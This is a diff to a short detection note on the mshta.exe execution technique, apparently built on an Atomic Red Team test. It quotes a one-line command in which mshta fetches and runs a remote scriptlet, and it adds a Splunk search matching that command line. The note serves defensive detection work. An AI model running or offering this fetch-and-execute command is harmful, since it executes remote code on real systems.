@@ -7,3 +7,16 @@ Mshta.exe is a Microsoft Utility that allows for the execution of HTML applicati
 #Attack 
 mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct')).Exec();close();
 
+![mshta](https://user-images.githubusercontent.com/36422282/55601275-2a38fa00-572e-11e9-838d-f32599684b26.PNG)
+
+
+*NOTE* This filter is specific and relates to the specific attack itself, as required to show correctnes within writing filters
+
+#Splunk Filter
+
+host="DESKTOP-EHTEINI" ParentCommandLine="mshta.exe  javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct')).Exec();close();"
+
+
+
+
+
